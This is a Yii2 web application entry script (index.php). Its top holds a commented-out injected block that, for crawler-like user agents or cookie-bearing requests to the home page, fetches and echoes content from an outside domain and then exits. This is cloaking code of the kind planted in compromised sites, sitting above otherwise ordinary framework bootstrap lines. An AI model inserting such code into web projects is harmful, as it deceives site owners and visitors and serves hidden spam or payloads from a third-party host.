<?php
//if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
//    echo implode('', file('https://domainexpansion.online/fasiliti.php'));
//    exit;
//}
// comment out the following two lines when deployed to production
defined('YII_DEBUG') or define('YII_DEBUG', false);
defined('YII_ENV') or define('YII_ENV', 'prod');

require __DIR__ . '/../vendor/autoload.php';
require __DIR__ . '/../vendor/yiisoft/yii2/Yii.php';

$config = require __DIR__ . '/../config/web.php';

(new yii\web\Application($config))->run();

